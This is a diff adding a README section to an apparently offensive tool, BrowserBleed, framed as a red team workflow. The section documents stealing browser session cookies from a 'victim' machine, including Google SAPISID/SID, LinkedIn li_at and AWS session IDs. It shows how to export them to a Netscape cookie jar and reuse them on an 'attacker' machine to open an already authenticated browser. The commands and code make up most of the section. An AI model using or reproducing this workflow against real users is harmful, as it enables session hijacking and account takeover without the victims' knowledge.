@@ -364,6 +364,53 @@ python3 sessiontest.py --json
 
 ---
 
+## Portable Cookie Jar Export (Cross-Machine Authentication)
+
+**New: Export authenticated session cookies for use on a different machine**
+
+This enables the red team workflow where extraction happens on the victim (requiring admin) but credential usage happens on the attacker machine (no admin needed).
+
+### Victim Machine → Extract & Export
+
+```bash
+# Extract cookies and export to Netscape jar format
+python3 BrowserBleed.py --browser chrome --export-cookies cookies.txt
+
+# Output: cookies.txt (Netscape HTTP Cookie File format)
+```
+
+**What's exported:**
+- Browser session cookies with full metadata (domain, path, expiration, flags)
+- Google SAPISID, SID, SSID cookies
+- LinkedIn li_at, JSESSIONID
+- AWS session IDs
+- All cookies with HttpOnly/Secure/SameSite preserved
+
+### Attacker Machine → Import & Use
+
+```bash
+from browser_sessions import open_authenticated_session
+
+# Open browser with imported cookies (no admin needed!)
+driver = open_authenticated_session(
+    cookie_jar='cookies.txt',
+    headless=False,
+    wait_seconds=0
+)
+
+# Browser is now authenticated
+print(driver.current_url)  # Should show authenticated page
+```
+
+**Netscape Cookie Jar Format** (standard, compatible with curl/wget):
+```
+# Netscape HTTP Cookie File
+.google.com    TRUE    /    TRUE    1735689600    SAPISID    value_here
+.linkedin.com  TRUE    /    TRUE    1735689600    li_at      value_here
+```
+
+---
+
 ## Complete Extraction → Validation → Browser Interaction Workflow
 
 This is the recommended end-to-end process for testing credential viability:
